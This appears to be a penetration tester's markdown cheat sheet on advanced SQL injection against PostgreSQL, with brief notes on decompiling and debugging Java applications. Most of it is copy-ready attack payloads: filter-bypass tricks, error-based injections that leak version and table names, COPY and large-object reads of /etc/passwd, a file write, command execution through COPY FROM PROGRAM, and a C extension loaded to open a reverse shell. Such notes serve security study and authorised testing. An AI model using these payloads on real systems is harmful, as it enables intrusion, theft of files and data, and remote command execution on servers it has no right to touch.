#web #sqli #postgresql #rce #java

# Advanced SQL Injection (PostgreSQL / Java)

Related: [sqli](sqli.md) · [blind-sqli](blind-sqli.md) · [sqlmap](sqlmap.md) · [whitebox](../CodeReview/whitebox.md)

## PostgreSQL CLI
```bash
psql -h <host> -U <username> <database>
```
Connect to PostgreSQL.

## Character/Space Bypasses
```sql
/**/
```
Use `/**/` instead of a space.

```sql
$$string$$
```
Use `$$string$$` instead of `'string'` (dollar-quoting).

## Error-Based (PostgreSQL)
```sql
' and 0=CAST((SELECT VERSION()) AS INT)-- 
```
Leak the version via a CAST error.

```sql
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)-- 
```
Leak table names via CAST error.

## File Read (COPY / Large Objects)
```sql
CREATE TABLE tmp (t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp; DROP TABLE tmp;
```
Read a file with COPY.

```sql
SELECT lo_import('/etc/passwd'); SELECT lo_get(16513);
```
Read a file via large objects.

## File Write (COPY)
```sql
CREATE TABLE tmp (t TEXT); INSERT INTO tmp VALUES ('data'); COPY tmp TO '/tmp/proof.txt'; DROP TABLE tmp;
```
Write a file with COPY.

## RCE
```sql
CREATE TABLE tmp(t TEXT); COPY tmp FROM PROGRAM 'id'; SELECT * FROM tmp; DROP TABLE tmp;
```
Command execution via COPY FROM PROGRAM.

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```
Compile a PostgreSQL C extension for RCE.

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('127.0.0.1', 443);
```
Load the extension and trigger a reverse shell.

## PostgreSQL Logging (debugging)
```bash
# /etc/postgresql/13/main/postgresql.conf
logging_collector = on
log_statement = 'all'
```
Enable statement logging for debugging injections.

## Java Decompilation (whitebox)
```bash
java -jar Fernflower.jar <Application>.jar <OutputDirectory>
```
Decompile a JAR with Fernflower.

```bash
jd-gui <Application>.jar
```
Decompile/browse a JAR with JD-GUI.

```bash
java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y -jar <Application>.jar
```
Start a Java app with a remote debugger (JDWP).
